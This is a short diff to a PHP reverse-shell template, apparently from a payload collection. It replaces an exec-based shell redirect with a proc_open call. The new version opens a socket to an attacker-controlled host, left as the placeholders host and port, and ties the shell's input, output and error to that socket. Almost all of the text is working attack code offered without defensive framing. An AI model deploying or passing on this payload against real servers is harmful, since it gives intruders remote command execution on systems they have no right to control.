@@ -1,9 +1,7 @@
 <?php
 // Open a new socket and connect to the attacker
-// The socket is associated with file descriptor 3 automatically
-fsockopen("*/host*", */port*);
-// $sock = fsockopen("*/host*", */port*);   // this is needed for proc_open() argument
+$sock = fsockopen("*\host*", *\port*);
 
-// Run the shell with redirected standard input/output/error to the socket
-exec("*/shell* <&3 >&3 2>&3");
+// Run the shell with redirected standard input, output and error to the socket
+proc_open("*\shell*", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
 ?>
